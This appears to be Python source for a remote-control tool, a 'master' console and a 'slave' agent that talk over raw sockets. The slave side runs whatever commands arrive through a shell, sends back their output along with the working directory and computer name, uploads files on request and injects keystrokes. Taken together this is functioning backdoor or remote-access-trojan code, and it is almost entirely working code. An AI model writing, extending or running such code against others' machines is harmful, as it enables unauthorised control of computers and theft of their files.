import socket
import os
import subprocess
from pynput.keyboard import Controller,Key

HEADER = 64
FORMAT = "utf-8"
DISCONNECT_MSG = "Disco!"
ERROR_FILE = "[ERROR] cannot open the file"
ERROR_DIR ="[ERROR] cannot change directory"


def shellSlave(masterConn):
    confirm = reciveMsg(masterConn)
    cwd = os.getcwd()
    name = os.environ['COMPUTERNAME']
    print("No he mandado nada")
    sendMsg(masterConn,cwd)#Sending current working directory
    print("Ya mande cwd")
    sendMsg(masterConn,name)
    print("Ya mande name")
    connect = True
    presser = Controller()
    while connect:
        command = reciveMsg(masterConn)
        if (command == "exit"):
            connect = False
        elif command[:2] == "cd" and len(command) > 2:
            try:
                os.chdir(command[3:])
                cwd = os.getcwd()
                sendMsg(masterConn,cwd)
            except:
                print(ERROR_DIR)
                sendMsg(masterConn,ERROR_DIR)
        elif command[:9] == "download ":
            try:
                sendFile(masterConn,command[9:])
            except:
                masterConn.send(ERROR_FILE.encode(FORMAT))
        elif command[:5] == "type ":
            presser.type(command[5:])
            presser.press(Key.enter)
            sendMsg("Pressed")
        elif command[:6] == "press ":
            for character in command[6:]:
                presser.press(character)
            presser.press(Key.enter)
            sendMsg("Pressed")
        else:
            process = subprocess.run(command,capture_output=True, text=True,shell=True)
            msg = process.stdout + process.stderr
            sendMsg(masterConn,msg)

def shellMaster(slaveConn,slaveAddr):
    print(f"[CONNECTION] Connected to Slave {slaveAddr}.")
    slaveCWD = reciveMsg(slaveConn)
    slaveName = reciveMsg(slaveConn)
    connect = True
    while connect:
        command = input(f"{slaveName}@{slaveCWD}~#: ")
        if(command == "exit"):
            sendMsg(slaveConn,command)
            connect = False
        elif(command == "cls" or command == "clear"):
            os.system("cls")
        elif(command[:2] == "cd"):
            sendMsg(slaveConn,command)
            newCWD = reciveMsg(slaveConn)
            if (newCWD != ERROR_DIR):
                slaveCWD = newCWD
        elif(command[:9] == "download "):
            sendMsg(slaveConn,command)
            reciveFile(slaveConn,command[9:])
        else:
            sendMsg(slaveConn,command)
            res = reciveMsg(slaveConn)
            print(res)

def reciveFile(conn,file_name):
    file_size = conn.recv(HEADER).decode(FORMAT)
    if (file_size != ERROR_FILE):
        file_size = int(file_size)
        with open(file_name,"wb") as fileDownloaded:
            file_data = conn.recv(file_size)
            fileDownloaded.write(file_data)
    else:
        print(ERROR_FILE)

def sendFile(conn,file_name):
    complete_path = f"{os.getcwd()}\{file_name}"
    with open(file_name,"rb") as fileToSend:
        print("si se ejecuto esto")
        conn.send(str(os.path.getsize(complete_path)).encode(FORMAT))
        file_data = fileToSend.read()
        conn.send(file_data)

def reciveMsg(conn):
    msg_length = conn.recv(HEADER).decode(FORMAT)
    if (msg_length):
        msg_length = int(msg_length)
        msg = str(conn.recv(msg_length).decode(FORMAT))
        return msg 

def sendMsg(conn,msg):
    sendLen(conn,msg)
    conn.send(msg.encode(FORMAT))

def sendLen(conn,msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b" " * (HEADER - len(send_length))
    conn.send(send_length)

def recive(conn):
    while True:
        msg = reciveMsg(conn)
        if msg:
            print(f"client@:{msg}")
            
def send(conn):
    while True:
        msg = str(input("server@:"))
        sendMsg(conn,msg)